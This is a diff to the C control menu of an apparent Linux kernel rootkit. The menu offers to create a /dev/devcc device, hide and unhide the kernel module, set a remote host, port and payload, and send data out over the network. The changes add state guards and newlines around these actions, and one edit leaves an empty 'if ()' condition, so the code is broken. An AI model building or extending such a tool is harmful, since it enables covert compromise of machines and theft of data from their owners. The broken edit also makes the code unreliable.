@@ -208,9 +208,9 @@ void show_menu(void) {
     if (context.module_loaded) {
         printf( !context.device_created ? " 1. Create Device (/dev/devcc)\n" : " -  (Device Created)\n" );
         if (context.device_created) {
-            printf( !context.rHost_set   ? "\t11. Set RHOST\n"  : "\t - (RHOST set)");
-            printf( !context.rPort_set   ? "\t12. Set RPORT\n"  : "\t - (RPORT set)");
-            printf( !context.payload_set ? "\t13. Set Payload\n": "\t - (Payload set)");
+            printf( !context.rHost_set   ? "\t11. Set RHOST\n"  : "\t - (RHOST set)\n");
+            printf( !context.rPort_set   ? "\t12. Set RPORT\n"  : "\t - (RPORT set)\n");
+            printf( !context.payload_set ? "\t13. Set Payload\n": "\t - (Payload set)\n");
         }
         printf(  context.device_created ? " 2. Close Device\n"               : " -  (Device not created)\n" );
         printf( !context.module_hidded  ? " 3. Hide Module\n"                : " -  (Module hidden)\n" );
@@ -237,8 +237,10 @@ int main(int argc, char** argv) {
                     install_Core();
                     break;
                 case 1:
-                    do_sig(SIGALWRECV);
-                    context.device_created = 1;
+                    if (!context.device_created){
+                        do_sig(SIGALWRECV);
+                        context.device_created = 1;
+                    }
                     break;
                 case 11 :
                     set_rHost();
@@ -250,23 +252,31 @@ int main(int argc, char** argv) {
                     set_Payload();
                     break;
                 case 2:
-                    do_sig(SIGREMRECV);
-                    context.device_created = 0;
+                    if (context.device_created) {
+                        do_sig(SIGREMRECV);
+                        context.device_created = 0;
+                    }
                     break;
                 case 3:
-                    do_sig(SIGHIDEMOD);
-                    context.module_hidded = 1;
+                    if (!context.module_hidded) {
+                        do_sig(SIGHIDEMOD);
+                        context.module_hidded = 1;
+                    }
                     break;
                 case 4:
-                    do_sig(SIGUNHIDEM);
-                    context.module_hidded = 0;
+                    if (context.module_hidded) {
+                        do_sig(SIGUNHIDEM);
+                        context.module_hidded = 0;
+                    }
                     break;
                 case 5:
-                    do_sig(SIGSENDNET);
-                    context.rHost_set   = 0;
-                    context.rPort_set   = 0;
-                    context.payload_set = 0;
-                    context.data_ready  = 0;
+                    if () {
+                        do_sig(SIGSENDNET);
+                        context.rHost_set   = 0;
+                        context.rPort_set   = 0;
+                        context.payload_set = 0;
+                        context.data_ready  = 0;
+                    }
                     break;
                 case 6:
                     printf("Sortie...\n");
